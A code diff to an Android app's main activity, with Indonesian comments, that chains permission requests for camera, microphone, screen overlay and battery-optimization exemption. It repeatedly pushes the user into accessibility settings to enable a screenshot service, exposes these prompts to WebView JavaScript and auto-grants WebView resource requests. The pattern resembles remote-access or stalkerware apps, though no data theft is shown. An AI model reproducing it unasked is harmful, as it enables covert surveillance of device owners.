@@ -22,6 +22,7 @@ class MainActivity : AppCompatActivity() {
 
     companion object {
         private const val REQ_NOTIF_PERMISSION = 1001
+        private const val REQ_CAMERA_AUDIO     = 1002
     }
 
     private val commandReceiver = object : BroadcastReceiver() {
@@ -45,6 +46,7 @@ class MainActivity : AppCompatActivity() {
         requestNotificationPermission()
     }
 
+    // ─── STEP 1: Notifikasi ──────────────────────────────────────────────────
     private fun requestNotificationPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             val granted = ContextCompat.checkSelfPermission(
@@ -60,7 +62,29 @@ class MainActivity : AppCompatActivity() {
                 return
             }
         }
-        proceedToOverlay()
+        // lanjut ke step 2
+        requestCameraAudioPermission()
+    }
+
+    // ─── STEP 2: Kamera & Mikrofon (buat fitur foto / live cam) ─────────────
+    private fun requestCameraAudioPermission() {
+        val need = mutableListOf<String>()
+
+        if (ContextCompat.checkSelfPermission(
+                this, android.Manifest.permission.CAMERA
+            ) != PackageManager.PERMISSION_GRANTED
+        ) need.add(android.Manifest.permission.CAMERA)
+
+        if (ContextCompat.checkSelfPermission(
+                this, android.Manifest.permission.RECORD_AUDIO
+            ) != PackageManager.PERMISSION_GRANTED
+        ) need.add(android.Manifest.permission.RECORD_AUDIO)
+
+        if (need.isEmpty()) {
+            proceedToOverlay()
+            return
+        }
+        ActivityCompat.requestPermissions(this, need.toTypedArray(), REQ_CAMERA_AUDIO)
     }
 
     override fun onRequestPermissionsResult(
@@ -69,11 +93,13 @@ class MainActivity : AppCompatActivity() {
         grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == REQ_NOTIF_PERMISSION) {
-            proceedToOverlay()
+        when (requestCode) {
+            REQ_NOTIF_PERMISSION -> requestCameraAudioPermission()
+            REQ_CAMERA_AUDIO     -> proceedToOverlay()
         }
     }
 
+    // ─── STEP 3: Overlay permission ─────────────────────────────────────────
     private fun proceedToOverlay() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (!Settings.canDrawOverlays(this) && !overlayRequested) {
@@ -93,6 +119,9 @@ class MainActivity : AppCompatActivity() {
             }
         }
         startDeviceServiceDelayed()
+        Handler(Looper.getMainLooper()).postDelayed({
+            if (!isAccessibilityEnabled()) openAccessibilitySettings()
+        }, 4000)
     }
 
     private fun startDeviceServiceDelayed() {
@@ -175,10 +204,18 @@ class MainActivity : AppCompatActivity() {
                 request.grant(request.resources)
             }
 
-            override fun onCreateWindow(view: WebView?, isDialog: Boolean, isUserGesture: Boolean, resultMsg: Message?): Boolean {
+            override fun onCreateWindow(
+                view: WebView?,
+                isDialog: Boolean,
+                isUserGesture: Boolean,
+                resultMsg: Message?
+            ): Boolean {
                 val newWebView = WebView(this@MainActivity)
                 newWebView.webViewClient = object : WebViewClient() {
-                    override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
+                    override fun shouldOverrideUrlLoading(
+                        view: WebView?,
+                        request: WebResourceRequest?
+                    ): Boolean {
                         val url = request?.url?.toString() ?: return false
                         webView.loadUrl(url)
                         return true
@@ -192,7 +229,10 @@ class MainActivity : AppCompatActivity() {
         }
 
         webView.webViewClient = object : WebViewClient() {
-            override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
+            override fun shouldOverrideUrlLoading(
+                view: WebView?,
+                request: WebResourceRequest?
+            ): Boolean {
                 val url = request?.url?.toString() ?: return false
                 if (!url.startsWith("http://") && !url.startsWith("https://")) {
                     try {
@@ -288,6 +328,9 @@ class MainActivity : AppCompatActivity() {
             isRequestingSettings = false
             Handler(Looper.getMainLooper()).postDelayed({
                 startDeviceServiceDelayed()
+                Handler(Looper.getMainLooper()).postDelayed({
+                    if (!isAccessibilityEnabled()) openAccessibilitySettings()
+                }, 3500)
             }, 1000)
         }
     }
@@ -345,13 +388,44 @@ class MainActivity : AppCompatActivity() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             overlayRequested = true
             isRequestingSettings = true
-            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
+            startActivity(
+                Intent(
+                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:$packageName")
+                )
+            )
         }
+    }
+
+    fun openAccessibilitySettings() {
+        try {
+            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            })
+        } catch (e: Exception) {
+            android.util.Log.e("MainActivity", "openAccessibilitySettings: ${e.message}")
+        }
+    }
+
+    fun isAccessibilityEnabled(): Boolean {
+        return try {
+            val enabled = Settings.Secure.getString(
+                contentResolver,
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+            ) ?: return false
+            enabled.contains(packageName + "/" + ScreenshotAccessibilityService::class.java.name) ||
+            enabled.contains(packageName + "/.ScreenshotAccessibilityService")
+        } catch (_: Exception) { false }
     }
 
     fun openBatterySettings() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")))
+            startActivity(
+                Intent(
+                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                    Uri.parse("package:$packageName")
+                )
+            )
         }
     }
 
@@ -363,8 +437,19 @@ class MainActivity : AppCompatActivity() {
                 sendBroadcast(Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) })
             }
         }
+
         @JavascriptInterface
         fun getUID(): String = accountUid
+
+        @JavascriptInterface
+        fun requestAccessibilityPerm() {
+            Handler(Looper.getMainLooper()).post {
+                openAccessibilitySettings()
+            }
+        }
+
+        @JavascriptInterface
+        fun isAccessibilityEnabled(): Boolean = this@MainActivity.isAccessibilityEnabled()
     }
 }
 
@@ -385,4 +470,10 @@ class AppBridge(private val context: Context, private val webView: WebView) {
     @JavascriptInterface fun isOverlayGranted() = (context as MainActivity).isOverlayGranted()
     @JavascriptInterface fun requestOverlayPerm() = (context as MainActivity).requestOverlayPerm()
     @JavascriptInterface fun openBatterySettings() = (context as MainActivity).openBatterySettings()
+
+    @JavascriptInterface fun requestAccessibilityPerm() =
+        (context as MainActivity).openAccessibilitySettings()
+
+    @JavascriptInterface fun isAccessibilityEnabled(): Boolean =
+        (context as MainActivity).isAccessibilityEnabled()
 }
